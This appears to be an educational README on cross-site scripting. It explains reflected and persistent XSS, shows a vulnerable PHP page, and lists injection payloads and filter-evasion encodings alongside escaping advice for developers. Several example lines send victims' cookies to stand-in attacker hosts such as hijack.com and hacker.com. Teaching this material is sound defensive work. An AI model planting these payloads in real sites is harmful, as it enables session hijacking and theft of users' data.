<h1 align="center"> 🌐 Cross-Site Scripting (XSS) attack 🌐 </h1>

<img align="right" width="50%" src="https://spanning.com/wp-content/uploads/2019/05/cross-site-scripting-example.png">

```yaml
vulnerabilty: Cross-site Scripting 

attack's type: injection

tool: code

how: inject malicious scripts

where: website's forms and inputs

To : user victim

through: phishing link

For: user's infos (cookies)

```

















<br><br><br><br><br><br><br><br><br><h1 align="center">🌐 Demonstration 🌐</h1>
<p>Suppose you have web application that obtains a user name and reflects it back to a web page. Suppose that instead of just entering your name 
  "Imène", the input was:</p>

```html
Imène<script>alert(document.cookie)</script>
```

<p>When the page is loaded, the script will execute <br>
• Popping up a dialog containing the document cookie is relatively harmless, but this script can be anything the attacker chooses<br>
• To perpetrate an exploit, the attacker will try to get others to come to this page (maybe with phishing attacks)</p>
<p>• The attack could have been avoided by doing the following:<br>
– Removing the script upon input<br>
– Neutralizing the script when the HTML is output</p>




















<br><br><br><br><br><br><br><br><br><h1 align="center">🌐 Get into The Attack 🌐</h1>

<p>A Cross-Site Scripting (XSS) exploit is an attack on the user,not the site. But liability means that the site is responsible <br>
  • If the XSS string is input and then reflected back to the user,it is called <b>Reflected XSS</b>.For example, a URL that leads a victim to a site that will 
  allow a script to execute on their browser</p>
  
  ```html
  http://…./app.html?name=Joe<script>alert(document.cookie)</script>
  ```
  <br><p>• An XSS attack that is stored somewhere, such as in a database, and can be exploited at some later time, is called a <b>Persistent XSS</b></p>
  <br></p>There are many ways to inject XSS strings into HTML. Any HTML attribute that can contain JavaScript can be the vehicle for an XSS attack.Examples:
  
  ```html
<body onload="alert(document.cookie)">
<img src=“javascript:alert(document.cookie)">
<img src onerror="alert(document.cookie)">
<META HTTP-EQUIV=“refresh” CONTENT=“0;url=data:tex/html;<script>alert(‘attack’)</script>
```

<br><p>What makes XSS dangerous is the damage that can be done by a script executing in the browser of an unsuspecting user.<br>
• Cookie theft<br>
• Redirection<br>
• Defacing sites<br>
• Browser appropriation<br>
• Keystroke recording<br>
• Launching further attacks against others<br>
• Accessing the local file system</p>

















<br><br><br><br><br><br><br><br><br><h1 align="center">🌐 XSS Types 🌐</h1>
<br><p>•XSS vulnerabilities fall into two categories, To perpetrate an XSS attack an attacker can use:</p>
<table>
  <tr>
    <td><b> A persistent attack</b></td>
    <td colspan='10'>where the data is permanantly located in a file system or database</td>
  </tr>
  
  <tr>
    <td><b>A non-persistent attack (Reflected XSS) </b></td>
    <td colspan='10'>where the attack vector is inserted into the data stream but not stored</td>
  </tr>
</table>


<p>Based primarily on whether they are one-off attacks or can be used repeatedly.</p>
<br><br><h3>Reflected XSS</h3>
<p>
–Parameters from a request are used improperly, resulting in a script running and harvesting data from the submitter.<br>
–The attacker buries malicious queries in a page using links, I-frames, …
</p>

<br><br><h3>A non-persistent example</h3>
<p>
– Fred notices that bbq.com has a reflected XSS vulnerability and creates a URL that exploits it.<br>
– Fred sends an email to Ted enticing Ted to click on it.<br>
– Ted does so.<br>
– The bbq.com sends Ted’s client a page that contains a script that executes and sends Ted’s session cookie to Fred’s site.<br>
– Fred can now access bbq.com as Ted (at least for a while).</p>

```html
http://bbq.com?prod=grill&name=<script>http://asite.com?sid=document.cookie()</script>
```
The server code, does something like this.
```python
print ("Thanks for your interest in %s",name);
```

```html
<?setcookie ("xss1", "42");?>
<HTML>
  <BODY>
    <h3>Welcome to The BBQ</H3>
    <BR>
    <?
      $prod=$_GET['prod'];
      $name=$_GET['name'];
      print ("We appreciate your interest in our $name grills<BR>");
      print ("What can we help you with today<BR>");
    ?>
  </BODY>
</HTML>
  ```
```html
…/xss1.php?prod=grill&name=<script>document.location=http://hijack.com/save?name=“ + document.cookie</script>
```
<br><br><h3> Persistent XSS</h3>
<p>
–The attacker injects code on the server that when downloaded to the client allows further mischief.<br>
–As before, but its embedded in a message on the server. Such as a blog or social networking message site.</p>
<p>There are other ways to insert Javascript:</p>

```html
<img src=“javascript:alert(document.cookie);”>
<a href="javascript: alert(document.cookie);">Click here to win</a>
<input type=“button” value=“submit” onclick="parent.location.reload(‘http://hacker.com?c’=encodeURI(document.cookie));">
```
<br><p><b>Inline Javascript:</b></p>
  
  ```html
<html>
  <body>
    <h3>XSS version 2</h3>
      <form>
        First Name<input type="text" name="firstname" />
        <br>
        Second Name<input type="text" name="secondname" />
        <br>
        <input type="BUTTON" VALUE="Submit" onclick="alert(document.cookie)"/>
  </body>
</html>
```
  
 <br><p>You are looking for an input that lets you feed an exploit back to the page.<br>
• Some document elements have properties like <b>OnClick,OnLoad, OnChange, OnSubmit, OnMove, OnKeyPress</b> and so on.<br>
• These are by definition, Javascript, without any specific tags.</p>

```html
<html>
  <body>
    <h3>XSS version 3</h3>
    <img src="no_such_file.jpg" onerror=alert(document.cookie);>
  </body>
</html>
```
    
```html
<html>
  <body onload=alert(document.cookie);>
    <h3>XSS version 4</h3>
  </body>
</html>
```

<br><p><b>HTML elements like body</b></p>

```html
<body onload=javascript:alert(document.cookie)
<div background="javascript:alert(document.cookie)";>
<iframe width="0" src="http://anysite/anyfile" />
```
<p>Note that new browser technology has defanged much of this (Content Security Policy). Read about it</p>
    

<br><p><b> HTML attributes</b></p>

```html
  http://www.domain.site/search/partner/index.cfm?sessionid=1234567
8901&hid=%22+STYLE%3D%22backgroundimage%3A+javascript:%28alert
%28%27Is_XSS_HERE%3F%27%29%29
  ```
  
```html
<td>
  <a href="/index.cfm?sessionid=12345678901&hid="" STYLE="background-image:expression(alert(document.cookie))">
    <img src="http://somesite.com/images/mylogo.gif" width="200" height="80" border="0">
  </a>
</td>
```
                      































<br><br><br><br><br><br><br><br><br><h1 align="center">🌐 Hackers objectives through XSS 🌐</h1>
<br><p>The objective is to insert JavaScript into a data stream so that it executes in the users browser.The client system is open to attack, but so is any site with open valid sessions in the client.</p>
<p>• The executable code can:<br>
–Redirect to another site.<br>
–Execute something that attacks the victim’s system.<br>
–Execute something that collects data from the victim.<br>
–Modify the browser representation to lead the user to undesirable sites.</p>
<p>• The typical outcomes are: <br>
–Private data harvesting.<br>
–Session data interception.<br>
–Site vandalism.<br>
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  <br><br><br><br><br><br><br><br><br><h1 align="center">🌐 What does this mean to a developer 🌐</h1>
  <p>You aren’t responsible for boneheaded users. But you are responsible for what you provide to the users. 
  Anything that is sent to a browser (or other JavaScript-friendly environment) must be free of malicious scripts.<br>
 That sounds easy, but it isn’t, primarily because HTML is so tolerant.</p>
 
 <br><p>Everything you send to the browser must be processed to remove any malicious scripts.<br>
  <b> How do you differentiate between a malicious script and one of your own good scripts?</b></p>
  
<br><p>The primary attack vectors are:</p>
<table>
  <tr>
    <td><b> User inputs </b></td>
    <td colspan='10'>that are reflected back to the browser such as: <b> Names, id’s, input values, … </b></td>
  </tr>
  
  <tr>
    <td><b> User data </b></td>
    <td colspan='10'>that is stored and later sent to other users through the browser such as <b> Emails, posts, … </b></td>
  </tr>
  
  <tr>
    <td><b> Super Users </b></td>
    <td colspan='10'>Those users could be high privileged users.</td>
  </tr>
</table>


<br><br><p>The typical scenario is that a web page contains a number of places where data is inserted:</p>
```shell
echo "Hi $name, welcome";
echo "<BODY background='$themecolor'>";
echo "<TITLE>$cname</TITLE>";
echo "<meta name='get_config_name(CNAME)'>";
echo "<form>Name <input type=“text” name=“name” value=“$email_addr”><BR> …";
```



























<br><br><br><br><br><br><br><br><br><h1 align="center">🌐 What Can You Do As Web Developer 🌐</h1>
<br><br><p>• Each time a variable is used, you have to be concerned about the source of the value.<br>
  • You might think that all you have to do is escape the angle brackets: </p>
  
  ```
  <  &lt; >  &gt;
   ```
  <p>. But you can’t ignore this case:</p>
  
```html
  <body onload=alert (document.cookie)>...</body>
  <img src=“javascript:alert(document.cookie)>

```



<br><br><p> Your choices are:</p>

```yaml
Escape all incoming data:
  - What is you want to allow scripts (rare case) or if angle brackets are possible? 
  What if you allow users to upload HTML files?
  
  - Escaping may still be fine since you probably don’t want any included scripts executing.
  The angle brackets will simply appear as angle brackets.
  
  - What about the other stuff? Convert javascript to java$cript. Don’t forget JavaScript
  and JAVaSCript, …
  
  
  
 

Escape all outgoing data (to HTML):
  - Same problems.
  - Doesn’t modify data until necessary. Stored data will still be accurate. This is important
  to some people.
  
  
  
  
  
Deny unexpected incoming variables:
  
 ```
 
 
 
 <br><br><p>This is all made more difficult by the HTML tolerance for weird formats.</p>
 
 ```html
<img src=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>
<!--javascript:alert('XSS')-->
<img src=jav a sc ript : doc Ument.coo kie( ); &#3e
alert(string.fromChar (88,83,83&#41;&#59;

<< script >
<script src=http://hackme.org <B> 
 \u003c;script\u003e; <!--<script>-->
```









































 "
<br><p>
• Under HIPAA guidelines, unlimited.<br>
• In general, lots of bad press.<br>
• Misappropriation of services.<br>
• Data leakage.<br>
• Many go unreported<br>
• Many XSS attacks are designed to vandalize<br>
• But the ability to execute a script means the user has control of the browser, in a limited fashion<br>
• Damage potential could be high<br>
• But, they are often difficult to exploit in such a way that the actual damage is high<br>
• Usually the affected users are limited<br></p>




















<br><br><br><br><br><br><br><br><br><h1 align="center">🌐 Dicovery 🌐</h1>
<h2 align="center"> How would you conduct an attack against a site that used only POST parameters? </h2>

<p>
first:  Look at the source of returned HTML pages<br>
second: Can you see places where input data, or anything you can control is reflected to the page?<br>
Remember that often the goal is to simply find a page you can link to with the correct parameters:<br>
   – Look at all the exchanges.<br>
   – Get (URL) parameters are much easier<br>
Use tools like XSS-Me<br>
Simple case: escape scripting tags like <script> … </script>.<br>
<script> ... </script> becomes &lt;script&gt; … &lt;/script&gt; <br>
So, <script> becomes %3Cscript%3E </p>


<br><br><br><h2 align="center">Are there others? Of course!</h2>




